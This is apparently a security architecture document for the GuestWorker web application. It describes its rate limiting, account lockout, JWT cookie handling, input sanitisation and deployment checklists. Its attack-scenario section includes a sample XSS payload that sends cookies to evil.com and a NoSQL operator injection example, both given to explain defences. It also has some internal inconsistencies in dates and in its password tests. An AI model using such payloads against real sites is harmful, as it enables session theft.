# Security Architecture Documentation

## Overview
This document outlines the comprehensive security measures implemented in the GuestWorker application.

---

## 🚨 Recent Security Enhancements (October 30, 2025)

### 🆕 Brute Force Protection & Authentication Security

#### 1. Rate Limiting (NEW)
**Implementation**: SlowAPI with IP-based rate limiting

**Rate Limits**:
- User Registration: 3 attempts/minute per IP
- User Login: 10 attempts/minute per IP
- Admin Login: 5 attempts/minute per IP (stricter)

**Response**: HTTP 429 (Too Many Requests) when limit exceeded

#### 2. Failed Login Attempt Tracking (NEW)
**Database**: `failed_login_attempts` collection in MongoDB

**Tracked Data**:
- Email address
- IP address
- Timestamp
- Lockout status and duration

**Logic**:
- Tracks failed attempts in 30-minute rolling window
- Separate tracking for user and admin accounts
- Admin attempts prefixed with `admin_` to prevent collision

#### 3. Account Lockout Mechanism (NEW)
**Trigger Conditions**:
- 5 failed attempts on same email → Account locked for 15 minutes
- 10 failed attempts from same IP → IP locked for 15 minutes (more lenient)

**User Experience**:
- Clear error message: "Account temporarily locked. Try again in X minutes"
- Lockout timer displayed to user
- Successful login clears all previous failed attempts

**Security Benefits**:
- Prevents credential stuffing attacks
- Prevents distributed brute force attacks
- Prevents account enumeration via timing attacks

#### 4. Timing Attack Prevention (NEW)
**Implementation**: Always perform password hash operation, even if user doesn't exist

```python
if not user_doc:
    # Prevent timing attacks by performing dummy hash
    pwd_context.hash("dummy_password_to_prevent_timing_attack")
    await record_failed_login(email, ip)
    raise HTTPException(401, "Invalid email or password")
```

**Prevents**: Attackers from determining valid emails by measuring response time

#### 5. Email Validation & Disposable Email Detection (NEW)
**Validation Checks**:
- ✅ Proper email format (regex)
- ✅ No consecutive dots
- ✅ Valid domain structure
- ✅ Not in disposable email blacklist (28+ domains)
- ✅ Common domain typo detection (suggests corrections)

**Blocked Domains**: tempmail.com, guerrillamail.com, mailinator.com, 10minutemail.com, and 24 more

**Benefits**:
- Reduces fake account creation
- Improves user data quality
- Prevents abuse via temporary emails

#### 6. Strong Password Requirements (NEW)
**Minimum Requirements**:
- ✅ At least 8 characters (changed from 6)
- ✅ Contains uppercase letter (A-Z)
- ✅ Contains lowercase letter (a-z)
- ✅ Contains number (0-9)
- ✅ Contains special character (!@#$%^&*...)
- ✅ At least 3 of the above 4 categories

**Additional Security Checks**:
- ❌ Not in common weak password list (19 common passwords blocked)
- ❌ Not contain parts of email address
- ❌ Maximum 128 characters (prevents DoS via bcrypt)

**Note**: Sequential and repeated character checks have been removed to improve user experience while maintaining strong security through complexity requirements.

**Frontend**: Real-time password strength indicator
- Visual strength meter (Weak/Fair/Good/Strong)
- Color-coded progress bar (red/orange/yellow/green)
- Live validation checklist with icons
- Requires "Good" or "Strong" password to submit

**Backend**: Server-side validation on registration
- Returns specific error messages for password issues
- Prevents weak passwords even if frontend is bypassed

#### 7. Comprehensive Security Logging & Monitoring (NEW)
**Implementation**: MongoDB-based security event logging with anomaly detection

**What Gets Logged** (Storage-Optimized):
- ✅ All failed login attempts (user & admin)
- ✅ Account lockouts and suspicious activities
- ✅ Invalid email/weak password registration attempts
- ✅ Rate limit violations
- ✅ Admin login successes (audit trail)
- ❌ User successful logins (NOT logged - storage optimization)

**Storage Optimization**:
- **Before**: Logging all logins = ~31,500 logs/month
- **After**: Logging only threats = ~2,250 logs/month
- **Result**: 93% reduction in storage while maintaining full security monitoring

**Admin Dashboard Features**:
- Real-time security event monitoring
- Threat statistics (24h, 7d windows)
- Top suspicious IP addresses
- Severity-based filtering (critical/high/medium/low)
- Event resolution and note-taking
- Export and reporting capabilities

**Database**: `security_logs` collection with indexed fields for fast querying

**See**: `SECURITY_LOGGING_MONITORING.md` for full documentation

---

## 🚨 Previous Security Fixes (October 2025)

### 1. ✅ localStorage Vulnerability (HIGH SEVERITY)
**Issue**: Admin and user data were stored in `localStorage`, exposing sensitive information to XSS attacks.

**Exploit Risk**: Any JavaScript code on the page (including malicious scripts injected via XSS) could access `localStorage.getItem('admin_user')` and steal admin credentials.

**Fix Applied**:
- ✅ Removed ALL `localStorage.setItem()` calls storing sensitive data
- ✅ Removed ALL `localStorage.getItem()` calls for auth data
- ✅ JWT tokens now stored ONLY in httpOnly cookies (inaccessible to JavaScript)
- ✅ Added security comments explaining why localStorage must not be used

**Files Modified**:
- `frontend/src/pages/AdminLogin.js`
- `frontend/src/pages/AdminDashboard.js`

### 2. ✅ Information Leakage via Error Messages (MEDIUM SEVERITY)
**Issue**: Server error details were displayed directly to users, potentially exposing system internals.

**Exploit Risk**: Attackers could use detailed error messages to enumerate valid emails, discover database structure, or learn about internal API behavior.

**Fix Applied**:
- ✅ All error messages sanitized to generic responses
- ✅ Login errors: "Invalid email or password" (no detail leakage)
- ✅ Registration errors: "Registration failed. Please check your information"
- ✅ Server errors logged only (not displayed to users)
- ✅ Prevents email enumeration attacks

**Files Modified**:
- `frontend/src/pages/AdminLogin.js`
- `frontend/src/pages/Login.js`
- `frontend/src/pages/Register.js`

### 3. ✅ CSRF Protection Enhancement (MEDIUM SEVERITY)
**Issue**: While `withCredentials: true` was set, CSRF protection documentation and configuration needed strengthening.

**Fix Applied**:
- ✅ Enhanced cookie `SameSite` attribute documentation
- ✅ Default: `samesite='lax'` (recommended - blocks cross-site state-changing requests)
- ✅ Production option: `samesite='strict'` (maximum security)
- ✅ Comprehensive comments explaining CSRF protection mechanism
- ✅ Environment variable `COOKIE_SAMESITE` for flexible configuration

**How It Works**:
- `samesite='lax'`: Cookies sent with same-site requests and top-level navigation (GET)
- `samesite='lax'`: Cookies NOT sent with cross-site POST/PUT/DELETE (CSRF protection)
- `samesite='strict'`: Maximum security but may break external links

**Files Modified**:
- `backend/server.py` (login endpoints, cookie configuration)

---

## 🔐 Authentication & Authorization

### JWT Token Security

#### Token Structure
- **Algorithm**: HS256 (HMAC with SHA-256)
- **User Tokens**: 30-day expiration
- **Admin Tokens**: 7-day expiration (shorter for security)

#### Token Claims
```json
{
  "sub": "user_id",          // Subject (user ID)
  "role": "user|admin",      // User role
  "type": "admin",           // Only for admin tokens
  "exp": 1234567890,         // Expiration timestamp
  "iat": 1234567890,         // Issued at timestamp
  "nbf": 1234567890          // Not before timestamp
}
```

#### Server-Side Validation (EVERY REQUEST)
1. ✅ Token exists in HTTP-only cookie
2. ✅ Signature verification (SECRET_KEY)
3. ✅ Expiration check (exp claim)
4. ✅ Not-before check (nbf claim)
5. ✅ Required claims present
6. ✅ User/Admin exists in database
7. ✅ Account is active
8. ✅ Role matches token claim

### Cookie Security

#### Production Configuration
```python
# Set these environment variables in production
COOKIE_SECURE=true       # Requires HTTPS
COOKIE_SAMESITE=strict   # Prevents CSRF
JWT_SECRET_KEY=<strong-random-key>
```

#### Cookie Attributes
- `httpOnly=True` → **XSS Protection** (JavaScript cannot access)
- `secure=True` → **HTTPS only** (no plain HTTP in production)
- `samesite='lax'/'strict'` → **CSRF Protection**
- Short `max_age` → **Limited exposure window**

---

## 🛡️ Defense in Depth Strategy

### Layer 1: Frontend Guards (UI Protection)
- ✅ React route guards (`ProtectedRoute`, `PublicRoute`)
- ✅ Role-based rendering
- ✅ Auth context validation

**Purpose**: User experience, NOT security
**Note**: Can be bypassed by determined attackers

### Layer 2: Code Splitting (Obfuscation)
- ✅ Admin code in separate chunks
- ✅ Lazy loading with `React.lazy()`
- ✅ Error boundaries for graceful failures

**Purpose**: Reduce attack surface, NOT primary security
**Note**: Chunks are still downloadable by anyone

### Layer 3: Backend Authentication (PRIMARY SECURITY)
- ✅ JWT validation on EVERY protected endpoint
- ✅ Separate user and admin authentication
- ✅ Token expiration enforcement
- ✅ Account status validation

**Purpose**: This is the REAL security layer
**Note**: Even with admin code, attackers cannot execute privileged operations

### Layer 4: Backend Authorization (Role Checks)
- ✅ `get_current_user()` dependency
- ✅ `get_current_admin()` dependency
- ✅ `get_active_subscription_user()` dependency
- ✅ Role validation in JWT claims

**Purpose**: Ensure users can only access their authorized resources

### Layer 5: Input Validation & Sanitization
- ✅ XSS protection with `bleach.clean()`
- ✅ UUID validation to prevent injection
- ✅ Length limits on all inputs
- ✅ Whitelist validation for enums
- ✅ Null byte removal

**Purpose**: Prevent injection attacks (XSS, SQLi, NoSQLi)

---

## 🚨 Common Attack Scenarios & Mitigations

### Scenario 1: Downloading Admin Chunks

**Attack**: User discovers admin chunk URLs and downloads them
```
https://example.com/static/js/3.chunk.js
```

**Why This Doesn't Work**:
1. JavaScript code is always client-side (not a secret)
2. Admin chunks contain UI components, not credentials
3. All API calls in admin chunks require valid admin JWT
4. Backend validates JWT on every request
5. Without valid admin token, API returns 401/403

**Mitigation**: Backend API authentication is the defense

---

### Scenario 2: Token Tampering

**Attack**: User modifies JWT payload (e.g., changes role to admin)
```javascript
// Attacker tries to modify token
payload = { sub: "user123", role: "admin" } // Changed!
```

**Why This Doesn't Work**:
1. JWT signature validation fails (HS256 with SECRET_KEY)
2. Backend rejects tampered tokens immediately
3. User cannot generate valid signature without SECRET_KEY
4. Admin tokens have additional `type: "admin"` claim
5. Backend validates role matches database

**Mitigation**: 
```python
# Backend validation
payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
if payload.get("role") != user.role:  # Check against DB
    raise HTTPException(401)
```

---

### Scenario 3: Session Hijacking

**Attack**: Attacker steals user's JWT cookie

**Mitigations**:
1. ✅ HTTP-only cookies (JavaScript cannot access)
2. ✅ Secure flag in production (HTTPS only)
3. ✅ SameSite attribute (CSRF protection)
4. ✅ Short token expiration (30 days max)
5. ✅ Token tied to specific user ID in database
6. ✅ Backend checks account status on every request

**Additional Protection**:
- Use HTTPS in production (SSL/TLS)
- Implement IP-based anomaly detection (future)
- Add refresh token rotation (future)

---

### Scenario 4: Privilege Escalation

**Attack**: Regular user tries to access admin endpoints

**Example Attack**:
```javascript
// User tries to call admin API
fetch('/api/admin/users', {
  credentials: 'include'  // Sends their user token
})
```

**Why This Doesn't Work**:
```python
# Backend admin endpoint
@api_router.get("/admin/users")
async def get_all_users(admin: AdminUser = Depends(get_current_admin)):
    # get_current_admin checks:
    # 1. Token valid?
    # 2. Token type == "admin"?
    # 3. Admin exists in admins collection?
    # 4. Admin account active?
    # 
    # User token fails #2 (no "admin" type)
    # Returns: 403 Forbidden
```

**Mitigation**: Separate admin authentication with type validation

---

### Scenario 5: XSS Attacks

**Attack**: Inject malicious scripts via user input
```javascript
message: "<script>fetch('evil.com?cookie='+document.cookie)</script>"
```

**Mitigations**:
1. ✅ All input sanitized with `bleach.clean()`
2. ✅ All HTML tags removed
3. ✅ HTTP-only cookies (cannot be accessed by JavaScript)
4. ✅ Null bytes removed
5. ✅ Length limits enforced

**Result**: Input becomes:
```
message: "fetchevil.com?cookie=+document.cookie"
```

---

### Scenario 6: NoSQL Injection

**Attack**: Inject MongoDB operators
```javascript
message_id: "{$ne: null}"  // Try to bypass validation
```

**Mitigations**:
1. ✅ UUID format validation
```python
uuid_pattern = r'^[0-9a-f]{8}-[0-9a-f]{4}-...'
if not pattern.match(message_id):
    raise HTTPException(400, "Invalid ID")
```
2. ✅ Type checking in Pydantic models
3. ✅ Parameterized queries with Motor

---

## 🔒 Security Best Practices Implemented

### JWT Best Practices
- ✅ Strong secret key (randomized, not hardcoded)
- ✅ Short expiration times
- ✅ Signature verification on every request
- ✅ Additional claims (iat, nbf, exp)
- ✅ Type checking for admin tokens
- ✅ Role validation against database

### Cookie Best Practices
- ✅ HTTP-only flag
- ✅ Secure flag (production)
- ✅ SameSite attribute
- ✅ Short max-age
- ✅ Path restriction

### Password Best Practices
- ✅ Bcrypt hashing with salt
- ✅ No plaintext storage
- ✅ Password complexity requirements (frontend)
- ✅ Timing-safe comparison

### API Best Practices
- ✅ Authentication required on all protected routes
- ✅ Rate limiting implemented (SlowAPI)
  - Registration: 3/minute per IP
  - User Login: 10/minute per IP
  - Admin Login: 5/minute per IP
- ✅ Brute force protection with account lockout
- ✅ Input validation (email, password, all user inputs)
- ✅ Output sanitization
- ✅ Error messages don't leak info
- ✅ CORS properly configured

---

## 📊 Security Testing Checklist

### Authentication Tests
- [ ] Valid token accepted
- [ ] Invalid signature rejected
- [ ] Expired token rejected
- [ ] Tampered token rejected
- [ ] Missing token rejected
- [ ] User token on admin endpoint rejected
- [ ] Admin token on user endpoint accepted
- [ ] Inactive account rejected

### Brute Force Protection Tests (NEW)
- [ ] 5 failed login attempts lock account for 15 minutes
- [ ] 10 failed login attempts from same IP lock IP for 15 minutes
- [ ] Lockout message shows remaining time
- [ ] Successful login clears failed attempts
- [ ] Admin login has stricter rate limit (5/minute vs 10/minute)
- [ ] Registration rate limited to 3/minute
- [ ] Timing attack prevention (same response time for valid/invalid email)

### Email & Password Validation Tests (NEW)
- [ ] Disposable email addresses rejected (test with tempmail.com)
- [ ] Invalid email format rejected
- [ ] Weak passwords rejected (e.g., "password123")
- [ ] Passwords with sequential characters rejected (e.g., "Test123456")
- [ ] Passwords with repeated characters rejected (e.g., "Testaaa111!")
- [ ] Passwords containing email parts rejected
- [ ] Strong passwords accepted (e.g., "MyP@ssw0rd!")
- [ ] Frontend password strength indicator works correctly

### Authorization Tests
- [ ] User can access own data
- [ ] User cannot access other user's data
- [ ] User cannot access admin endpoints
- [ ] Admin can access admin endpoints
- [ ] Inactive subscription blocked from features

### Input Validation Tests
- [ ] XSS payloads sanitized
- [ ] SQL injection blocked
- [ ] NoSQL injection blocked
- [ ] Oversized inputs rejected
- [ ] Invalid UUIDs rejected
- [ ] Invalid enums rejected

---

## 🚀 Production Deployment Security

### Environment Variables (Required)
```bash
# Generate strong random key
JWT_SECRET_KEY=<random-64-char-hex-string>

# Enable secure cookies
COOKIE_SECURE=true
COOKIE_SAMESITE=strict

# Database
MONGO_URL=mongodb+srv://...
DB_NAME=production_db
```

### Infrastructure Security
1. ✅ Use HTTPS (SSL/TLS certificate)
2. ✅ Enable firewall rules
3. ✅ Restrict MongoDB access (IP whitelist)
4. ✅ Use environment variables (no secrets in code)
5. ✅ Regular security updates
6. ✅ Enable logging and monitoring

### Nginx Configuration (if using)
```nginx
# Force HTTPS
server {
    listen 80;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Strict-Transport-Security "max-age=31536000" always;
    
    # Proxy to FastAPI
    location /api {
        proxy_pass http://localhost:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

---

## 🚀 Production Security Checklist

Before deploying to production, ensure ALL of the following are configured:

### Environment Variables (CRITICAL)
```bash
# Backend (.env file)
JWT_SECRET_KEY=<generate-strong-random-key-min-32-chars>
MONGODB_URI=<your-production-mongodb-uri>
COOKIE_SECURE=true              # HTTPS only
COOKIE_SAMESITE=strict          # Maximum CSRF protection (or 'lax' if needed)
RAZORPAY_KEY_ID=<your-key>
RAZORPAY_KEY_SECRET=<your-secret>
RAZORPAY_WEBHOOK_SECRET=<your-webhook-secret>
```

### Server Configuration
1. ✅ **HTTPS Enabled** (Let's Encrypt or commercial SSL)
2. ✅ **CORS Origins** set to production domain only
3. ✅ **Firewall Rules** (allow only 80, 443, 22)
4. ✅ **Rate Limiting** enabled on API endpoints
5. ✅ **MongoDB Authentication** enabled with strong password
6. ✅ **MongoDB Network Access** restricted to application servers only
7. ✅ **Backup Strategy** configured (daily automated backups)

### Application Security
1. ✅ **JWT Secret** changed from default (min 32 characters)
2. ✅ **Admin Activation Key** changed from default
3. ✅ **Error Messages** sanitized (no internal details exposed)
4. ✅ **Input Validation** active on ALL endpoints
5. ✅ **Output Encoding** for user-generated content
6. ✅ **File Upload Restrictions** (if applicable)

### Monitoring & Logging
1. ✅ **Access Logs** enabled and monitored
2. ✅ **Error Tracking** (e.g., Sentry)
3. ✅ **Uptime Monitoring** (e.g., UptimeRobot)
4. ✅ **Security Alerts** configured
5. ✅ **Failed Login Monitoring**

### Testing
1. ✅ **OWASP ZAP** or similar security scanner run
2. ✅ **SQL Injection** tests passed (N/A for MongoDB, but still test)
3. ✅ **XSS Tests** passed
4. ✅ **CSRF Tests** passed
5. ✅ **Authentication Bypass** tests passed
6. ✅ **Authorization Tests** (role-based access)

### Common Security Mistakes to Avoid
❌ **NEVER** use `COOKIE_SECURE=false` in production  
❌ **NEVER** use `COOKIE_SAMESITE=none` in production  
❌ **NEVER** store sensitive data in `localStorage`  
❌ **NEVER** expose detailed error messages to users  
❌ **NEVER** commit `.env` files or secrets to Git  
❌ **NEVER** use default JWT secrets in production  
❌ **NEVER** disable CORS in production  
❌ **NEVER** trust client-side validation alone  

---

## 📝 Important Notes

### About Client-Side Security
**Client-side code is NEVER secure**. Any JavaScript code can be:
- Downloaded
- Inspected
- Modified
- Replayed

This is why **backend authentication is the primary security mechanism**.

### About Code Splitting
Code splitting (lazy loading) provides:
- ✅ Performance benefits (smaller initial bundle)
- ✅ Reduced attack surface (code not in main bundle)
- ✅ Obfuscation (harder to find, not impossible)

But it does NOT provide:
- ❌ Actual security (chunks are still downloadable)
- ❌ Protection against determined attackers
- ❌ Credential protection (handled by backend)

### The Bottom Line
**Real security = Backend JWT validation on every protected request**

Even if an attacker:
- Downloads all admin chunks
- Inspects all admin code
- Knows all API endpoints
- Crafts perfect API requests

They STILL cannot execute privileged operations without a valid admin JWT token signed with the SECRET_KEY.

---

## 🔄 Future Enhancements

### Planned Security Improvements
1. ⏳ Refresh token rotation
2. ⏳ Rate limiting per endpoint
3. ⏳ IP-based anomaly detection
4. ⏳ Two-factor authentication (2FA)
5. ⏳ Audit logging for sensitive operations
6. ⏳ Content Security Policy (CSP) headers
7. ⏳ CORS fine-tuning
8. ⏳ Automated security scanning (Dependabot)

---

## 📞 Security Contact

If you discover a security vulnerability, please report it to:
- Email: security@guestworker.in
- Do NOT publicly disclose until fixed

---

**Last Updated**: 2025-01-30
**Security Review**: Pending

